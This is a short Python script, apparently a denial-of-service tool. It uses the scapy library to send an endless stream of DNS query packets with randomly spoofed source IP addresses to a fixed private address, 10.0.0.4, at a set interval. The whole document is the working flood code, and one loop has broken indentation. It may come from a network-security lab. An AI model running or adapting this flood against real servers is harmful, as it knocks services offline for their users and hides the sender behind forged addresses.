import sys
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from random import randrange
import time

def sourceIPgen():
	#this function generates random IP addresses
	# these values are not valid for first octet of IP address
	not_valid = [10,127,254,255,1,2,169,172,192]
	first = randrange(1,256)
	while first in not_valid:
	first = randrange(1,256)
	print first
	ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
	print ip
	return ip


# open interface eth0 to send packets
interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
while True:
	packets = Ether()/IP(dst="10.0.0.4", src=sourceIPgen())/UDP(dport=53, sport=80)/DNS(rd=1,qd=DNSQR(qname="ddos.org"))  
	#print(packets)
	sendp(packets, iface=interface.rstrip(), inter=0.011) #change inter to change the frequency of packet sent
